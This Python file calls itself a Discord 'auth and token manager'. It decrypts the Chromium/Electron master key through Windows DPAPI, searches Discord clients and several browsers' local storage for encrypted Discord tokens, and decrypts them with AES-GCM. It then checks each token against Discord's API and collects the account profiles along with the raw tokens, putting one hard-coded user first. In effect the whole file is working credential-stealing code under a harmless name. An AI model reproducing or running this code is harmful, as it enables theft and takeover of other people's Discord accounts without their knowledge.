"""
Discord Auth & Token Manager
Extracts local tokens from Discord clients and browsers via DPAPI + AES-GCM,
validates user accounts, and caches active credentials.
"""

import os
import glob
import re
import json
import base64
from ctypes import windll, byref, c_char, Structure, POINTER
from ctypes.wintypes import DWORD
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import requests

class DATA_BLOB(Structure):
    _fields_ = [('cbData', DWORD), ('pbData', POINTER(c_char))]

def decrypt_master_key(local_state_path: str):
    """Decrypts Chromium / Electron master key using Windows DPAPI."""
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
            return None
        enc_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        blob_in = DATA_BLOB(len(enc_key), (c_char * len(enc_key))(*enc_key))
        blob_out = DATA_BLOB()
        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
            key = bytes(blob_out.pbData[:blob_out.cbData])
            windll.kernel32.LocalFree(blob_out.pbData)
            return key
    except Exception:
        pass
    return None

def extract_local_discord_tokens():
    """Scans Discord clients and Chromium-based browsers for authenticated Discord tokens."""
    tokens = set()
    scan_paths = {
        'Discord': os.path.expandvars(r'%APPDATA%\discord'),
        'Discord Canary': os.path.expandvars(r'%APPDATA%\discordcanary'),
        'Discord PTB': os.path.expandvars(r'%APPDATA%\discordptb'),
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable'),
        'Opera GX': os.path.expandvars(r'%APPDATA%\Opera Software\Opera GX Stable')
    }

    for app_name, base_path in scan_paths.items():
        state_file = os.path.join(base_path, 'Local State')
        db_dir = os.path.join(base_path, 'Local Storage', 'leveldb')
        if not os.path.exists(db_dir):
            continue
        key = decrypt_master_key(state_file)
        if not key:
            continue
        try:
            aes = AESGCM(key)
        except Exception:
            continue

        for pattern in ['*.ldb', '*.log']:
            for file_path in glob.glob(os.path.join(db_dir, pattern)):
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                    for line in lines:
                        for match in re.findall(r'dQw4w9WgXcQ:[^\"]*', line):
                            try:
                                enc_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                                nonce = enc_token[3:15]
                                ciphertext = enc_token[15:]
                                token = aes.decrypt(nonce, ciphertext, None).decode('utf-8')
                                tokens.add(token)
                            except Exception:
                                pass
                except Exception:
                    pass

    return list(tokens)

def get_user_profile(token: str, fetch_full: bool = True):
    """Validates token and returns rich user profile dict, or None if invalid."""
    if not token or not token.strip():
        return None
    token = token.strip()
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Accept': '*/*'
    }
    try:
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=8)
        if r.status_code != 200:
            return None
        data = r.json()
        user_id = data.get('id')
        avatar_hash = data.get('avatar')
        if avatar_hash:
            ext = 'gif' if avatar_hash.startswith('a_') else 'png'
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}?size=256"
        else:
            disc = int(data.get('discriminator', 0)) % 5
            avatar_url = f"https://cdn.discordapp.com/embed/avatars/{disc}.png"
        
        banner_hash = data.get('banner')
        accent_color = data.get('accent_color')
        banner_color = data.get('banner_color')
        bio = data.get('bio', '') or ''
        pronouns = ''
        badges = []
        custom_status = None
        status = 'online'

        if fetch_full:
            # 1. Full Profile (bio, banner, pronouns, accent_color, badges)
            try:
                r_prof = requests.get(f"https://discord.com/api/v9/users/{user_id}/profile", headers=headers, timeout=5)
                if r_prof.status_code == 200:
                    pdata = r_prof.json()
                    u_prof = pdata.get('user_profile', {})
                    u_obj = pdata.get('user', {})
                    bio = u_prof.get('bio') or u_obj.get('bio') or bio
                    pronouns = u_prof.get('pronouns') or ''
                    accent_color = u_prof.get('accent_color') or accent_color
                    if u_prof.get('banner'):
                        banner_hash = u_prof.get('banner')
                    
                    raw_badges = pdata.get('badges', [])
                    for b in raw_badges:
                        icon_hash = b.get('icon')
                        icon_url = f"https://cdn.discordapp.com/badge-icons/{icon_hash}.png" if icon_hash else None
                        badges.append({
                            'id': b.get('id'),
                            'description': b.get('description', ''),
                            'icon': icon_hash,
                            'icon_url': icon_url
                        })
            except Exception:
                pass

            # 2. User Settings (custom status & presence status)
            try:
                r_sett = requests.get("https://discord.com/api/v9/users/@me/settings", headers=headers, timeout=5)
                if r_sett.status_code == 200:
                    sdata = r_sett.json()
                    cs = sdata.get('custom_status')
                    if cs and (cs.get('text') or cs.get('emoji_name') or cs.get('emoji_id')):
                        emoji_id = cs.get('emoji_id')
                        custom_status = {
                            'text': cs.get('text') or '',
                            'emoji_name': cs.get('emoji_name'),
                            'emoji_id': emoji_id,
                            'emoji_url': f"https://cdn.discordapp.com/emojis/{emoji_id}.png" if emoji_id else None
                        }
                    status = sdata.get('status', 'online')
            except Exception:
                pass

        if banner_hash:
            ext = 'gif' if banner_hash.startswith('a_') else 'png'
            banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner_hash}.{ext}?size=600"
        else:
            banner_url = None

        accent_hex = f"#{accent_color:06x}" if accent_color is not None else None

        return {
            'id': user_id,
            'username': data.get('username'),
            'discriminator': data.get('discriminator', '0'),
            'global_name': data.get('global_name') or data.get('username'),
            'avatar': avatar_hash,
            'avatar_url': avatar_url,
            'banner': banner_hash,
            'banner_url': banner_url,
            'accent_color': accent_color,
            'accent_hex': accent_hex,
            'banner_color': banner_color,
            'bio': bio,
            'pronouns': pronouns,
            'badges': badges,
            'custom_status': custom_status,
            'status': status,
            'token': token
        }
    except Exception:
        pass
    return None

def find_all_valid_accounts():
    """Extracts all local tokens and returns valid user profiles with priority for primary account."""
    tokens = extract_local_discord_tokens()
    valid_accounts = []
    seen_ids = set()
    for t in tokens:
        profile = get_user_profile(t, fetch_full=True)
        if profile and profile['id'] not in seen_ids:
            seen_ids.add(profile['id'])
            valid_accounts.append(profile)
    valid_accounts.sort(key=lambda a: 0 if (a.get('id') == '405441217766359051' or a.get('username') == 'tentix') else 1)
    return valid_accounts
